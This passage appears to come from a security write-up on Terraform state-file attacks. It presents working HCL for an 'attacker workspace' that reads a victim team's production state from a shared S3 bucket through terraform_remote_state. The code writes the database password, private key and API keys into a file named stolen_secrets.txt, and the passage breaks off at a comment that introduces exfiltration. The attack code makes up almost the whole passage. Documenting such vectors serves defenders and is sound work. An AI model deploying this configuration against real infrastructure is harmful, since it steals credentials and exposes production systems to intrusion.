## Vector A: State File Reading via terraform_remote_state

### Attack Implementation
```hcl
# attacker_workspace/main.tf
terraform {
  required_version = ">= 1.0"
  backend "s3" {
    bucket = "company-terraform-state"
    key    = "attacker/terraform.tfstate"
    region = "us-east-1"
  }
}

# Data source reading from VICTIM's state file
data "terraform_remote_state" "victim" {
  backend = "s3"

  config = {
    bucket = "company-terraform-state"
    key    = "production/database/terraform.tfstate"  # Victim's state path
    region = "us-east-1"
  }
}

# Extract sensitive data from victim's outputs
resource "local_file" "stolen_credentials" {
  filename = "${path.module}/stolen_secrets.txt"
  content  = <<-EOT
  Database Endpoint: ${data.terraform_remote_state.victim.outputs.db_endpoint}
  Database Password: ${data.terraform_remote_state.victim.outputs.db_password}
  Private Key: ${data.terraform_remote_state.victim.outputs.private_key}
  API Keys: ${jsonencode(data.terraform_remote_state.victim.outputs.api_keys)}
  EOT
}

# Exfiltrate via "legitimate" resource
